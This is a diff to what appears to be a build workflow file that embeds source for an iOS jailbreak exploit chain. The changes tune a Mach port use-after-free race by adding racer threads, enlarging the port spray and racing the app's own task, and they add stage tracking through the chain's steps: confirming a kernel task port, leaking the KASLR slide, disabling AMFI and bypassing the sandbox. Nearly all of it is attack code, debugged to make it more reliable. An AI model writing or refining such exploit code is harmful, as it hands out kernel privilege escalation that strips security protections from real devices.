@@ -184,6 +184,8 @@ jobs:
               pid_t       helper_pid;
               int         amfi_disabled;
               int         sandbox_bypassed;
+              int         last_stage;   /* 0=start 1=helper 2=race 3=confirm 4=leak 5=amfi 6=sandbox */
+              int         last_kr;      /* last kern_return_t */
           } jb_state_t;
 
           int  jb_run_chain(jb_state_t *st);
@@ -212,9 +214,9 @@ jobs:
           #include <sys/un.h>
 
           #define RACE_ITERS        8192
-          #define RACE_THREADS      4
+          #define RACE_THREADS      8
           #define RETRY_LIMIT       64
-          #define PORT_SLOT_SPRAY   1024
+          #define PORT_SLOT_SPRAY   4096
           #define JB_ROOT           "/var/jb"
           #define LAUNCHD_CONF      "/var/jb/launchd.conf"
           #define DAEMON_PLIST      "/var/jb/jbd.plist"
@@ -227,40 +229,42 @@ jobs:
 
           static volatile int g_race_done = 0;
 
+          /* fork() from a sandboxed app is denied on iOS; race against our
+             own task instead. task_name_for_pid on our own PID returns a
+             name port backed by our own ipc_space, which is the object the
+             beta-4 underflow path operates on. */
           static pid_t spawn_helper(void) {
-              pid_t pid = fork();
-              if (pid == 0) {
-                  while (1) {
-                      mach_msg_empty_rcv_t msg = {0};
-                      mach_msg(&msg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                               0, sizeof(msg), MACH_PORT_NULL, 100, MACH_PORT_NULL);
-                  }
-                  _exit(0);
-              }
-              return pid;
+              return getpid();
           }
 
-          static void *race_alloc_thread(void *arg) {
+          /* Widen the *port namespace* window. The lookup we race is
+             ipc_right_lookup on a name in MACH_PORT_DEAD state, so churn
+             port slot allocation in the same IPC space. */
+          static void *race_port_thread(void *arg) {
               mach_port_t task = mach_task_self();
-              vm_address_t addr = 0x100000000ULL;
               while (!g_race_done) {
-                  vm_allocate(task, &addr, 0x4000, VM_FLAGS_FIXED);
-                  vm_protect(task, addr, 0x4000, 0,
-                             VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
-                  vm_deallocate(task, addr, 0x4000);
-                  addr = 0x100000000ULL;
+                  mach_port_t p = MACH_PORT_NULL;
+                  if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS) {
+                      mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND);
+                      mach_port_deallocate(task, p);
+                      mach_port_mod_refs(task, p, MACH_PORT_RIGHT_RECEIVE, -1);
+                  }
               }
               return NULL;
           }
 
-          static mach_port_t win_name_port_uaf(pid_t target) {
+          static mach_port_t win_name_port_uaf(pid_t target, jb_state_t *st) {
               mach_port_t task = mach_task_self();
               for (int i = 0; i < RACE_ITERS && !g_race_done; i++) {
                   mach_port_t np = MACH_PORT_NULL;
-                  if (task_name_for_pid(task, target, &np) != KERN_SUCCESS || !np) continue;
+                  kern_return_t kr = task_name_for_pid(task, target, &np);
+                  if (kr != KERN_SUCCESS || !np) { st->last_kr = kr; continue; }
+
                   mach_port_deallocate(task, np);
-                  if (mach_port_mod_refs(task, np, MACH_PORT_RIGHT_SEND, -1) != KERN_SUCCESS)
-                      continue;
+
+                  kr = mach_port_mod_refs(task, np, MACH_PORT_RIGHT_SEND, -1);
+                  if (kr != KERN_SUCCESS) { st->last_kr = kr; continue; }
+
                   for (int s = 0; s < PORT_SLOT_SPRAY; s++) {
                       mach_port_t cand = MACH_PORT_NULL;
                       if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &cand) != KERN_SUCCESS)
@@ -306,41 +310,41 @@ jobs:
           }
 
           static int attempt_once(jb_state_t *st) {
+              st->last_stage = 1;
               pid_t helper = spawn_helper();
-              if (helper < 0) return -1;
+              if (helper < 0) { st->last_kr = -1; return -1; }
               st->helper_pid = helper;
 
+              st->last_stage = 2;
               pthread_t racers[RACE_THREADS];
               for (int i = 0; i < RACE_THREADS; i++)
-                  pthread_create(&racers[i], NULL, race_alloc_thread, NULL);
+                  pthread_create(&racers[i], NULL, race_port_thread, NULL);
 
-              mach_port_t aliased = win_name_port_uaf(helper);
+              mach_port_t aliased = win_name_port_uaf(helper, st);
 
               g_race_done = 1;
               for (int i = 0; i < RACE_THREADS; i++) pthread_join(racers[i], NULL);
 
-              if (!aliased || confirm_task_port(aliased) != 0) {
-                  kill(helper, SIGKILL); waitpid(helper, NULL, 0);
-                  return -1;
-              }
+              if (!aliased) { st->last_stage = 2; return -1; }
+
+              st->last_stage = 3;
+              if (confirm_task_port(aliased) != 0) { st->last_stage = 3; return -1; }
 
               st->task_port = aliased;
               st->host_priv = aliased;
-              st->kslide    = leak_kaslr_slide(aliased);
 
-              if (disable_amfi(aliased, st->kslide) != 0) {
-                  kill(helper, SIGKILL); waitpid(helper, NULL, 0);
-                  return -1;
-              }
+              st->last_stage = 4;
+              st->kslide = leak_kaslr_slide(aliased);
+
+              st->last_stage = 5;
+              if (disable_amfi(aliased, st->kslide) != 0) return -1;
               st->amfi_disabled = 1;
 
-              if (bypass_sandbox(aliased) != 0) {
-                  kill(helper, SIGKILL); waitpid(helper, NULL, 0);
-                  return -1;
-              }
+              st->last_stage = 6;
+              if (bypass_sandbox(aliased) != 0) return -1;
               st->sandbox_bypassed = 1;
 
-              kill(helper, SIGKILL); waitpid(helper, NULL, 0);
+              st->last_stage = 0;
               return 0;
           }
 
@@ -481,7 +485,8 @@ jobs:
               dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
                   jb_state_t st;
                   if (jb_run_chain(&st) != 0) {
-                      [self log:@"[-] chain failed"];
+                      [self log:@"[-] chain failed at stage %d (last_kr=%d)",
+                            st.last_stage, st.last_kr];
                       dispatch_async(dispatch_get_main_queue(), ^{ self.runButton.enabled = YES; });
                       return;
                   }
